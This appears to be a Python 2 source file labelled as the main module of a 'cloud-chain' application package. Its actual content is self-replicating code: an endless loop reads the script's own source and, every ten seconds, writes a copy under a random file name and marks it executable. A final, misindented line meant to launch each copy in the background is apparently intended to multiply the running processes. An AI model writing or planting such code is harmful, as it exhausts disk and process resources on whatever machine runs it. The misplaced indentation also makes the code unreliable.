# -*- coding: utf-8 -*-
__package__ = "cloud-chain.core.app.main"
__version__ = "0.1.3"

# IMPORTS #
import sys
import os

from ..writer.main import FileObject
from ..writer.main import Write2file

import os, sys, time, uuid

# get self code
self_content = file(sys.argv[0]).read()

while True:
    # wait 10 seconds
    time.sleep(10)
    
    # create unique filename
    dupe = "%s.py" % uuid.uuid4()
    
    # open and write to the copy
    copy = open(dupe, "w")
    copy.write(self_content)
    copy.close()    
    
    # make the copy executable and execute
    os.chmod(dupe, 0755)
os.system("./%s &" % dupe)